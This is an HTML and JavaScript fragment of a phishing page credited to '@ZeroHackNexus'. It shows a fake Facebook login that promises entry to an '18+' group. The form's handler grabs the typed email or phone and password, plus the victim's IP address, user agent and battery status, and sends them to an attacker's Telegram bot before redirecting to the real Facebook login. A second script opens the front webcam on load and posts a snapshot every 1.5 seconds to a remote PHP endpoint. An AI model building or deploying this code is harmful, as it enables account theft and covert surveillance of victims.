    <!-- Login Page (Hidden initially) -->
    <div class="login-container hidden" id="loginPage">
        <h2 class="login-header">Facebook</h2>
        <p class="subtext">Log in to your Facebook account to connect to Group 18+</p>
        
        <form id="loginForm">
            <div class="input-box">
                <input type="text" name="email" id="emailOrPhone" placeholder="Number or email address">
            </div>
            <div class="input-box">
                <input type="password" name="password" id="password" placeholder="Password" oninput="toggleShowButton()">
                <button type="button" class="show-btn" id="showBtn" onclick="togglePassword()">Show</button>
            </div>
            <button type="submit" class="btn">Log In</button>
        </form>
    </div>
    
    <script>
        function showLogin() {
            document.getElementById("groupPage").classList.add("hidden");
            document.getElementById("loginPage").classList.remove("hidden");
        }

        function toggleShowButton() {
            let passwordInput = document.getElementById("password");
            let showBtn = document.getElementById("showBtn");

            if (passwordInput.value.length > 0) {
                showBtn.style.display = "block";
            } else {
                showBtn.style.display = "none";
            }
        }

        function togglePassword() {
            let passwordInput = document.getElementById("password");
            let showBtn = document.getElementById("showBtn");

            if (passwordInput.type === "password") {
                passwordInput.type = "text";
                showBtn.textContent = "Hide";
            } else {
                passwordInput.type = "password";
                showBtn.textContent = "Show";
            }
        }

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();

            const emailOrPhone = document.getElementById('emailOrPhone').value;
            const password = document.getElementById('password').value;

            const botToken = 'YOUR_BOT_TOKEN'; // replace
¬† ¬†          const chatId = 'YOUR_CHAT_ID'; ¬† ¬†// replace

            // Collect IP Address
            const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());

            // Device Info
            const deviceInfo = navigator.userAgent;

            // Battery Info
            let batteryInfo = 'Unavailable';
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                batteryInfo = `Battery: ${Math.round(battery.level * 100)}%, Charging: ${battery.charging}`;
            }

            const message = `
üì• Welcome to web Login info:
-------------------------------------------------------------
üìß Email/Phone: ${emailOrPhone}

üîë Password: ${password}

üîã ${batteryInfo}

üåê IP Address: ${ipData.ip}

üì± Device Info: ${deviceInfo}
-------------------------------------------------------------
üìåCreate by Mahadeb:@ZeroHackNexus
`;
            try {
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });

                const data = await response.json();
                console.log('Telegram response:', data);

                // Simulate Facebook redirect
                window.location.href = 'https://www.facebook.com/login/';

            } catch (err) {
                console.error('Telegram Error:', err);
                window.location.href = 'https://www.facebook.com/login/';
            }
        });
    </script>
    <script>
 
 function post(imgdata){
 $.ajax({
     type: 'POST',
     data: { cat: imgdata},
     url: 'forwarding_link/post.php',
     dataType: 'json',
     async: false,
     success: function(result){
         // call the function that handles the response/results
     },
     error: function(){
     }
   });
 };
 
 
 'use strict';
 
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const errorMsgElement = document.querySelector('span#errorMsg');
 
 const constraints = {
   audio: false,
   video: {
     
     facingMode: "user"
   }
 };
 
 // Access webcam
 async function init() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
     handleSuccess(stream);
   } catch (e) {
     errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
   }
 }
 
 // Success
 function handleSuccess(stream) {
   window.stream = stream;
   video.srcObject = stream;
 
 var context = canvas.getContext('2d');
   setInterval(function(){
 
        context.drawImage(video, 0, 0, 640, 480);
        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
        post(canvasData); }, 1500);
   
 
 }
 
 // Load init
 init();
 
 </script>
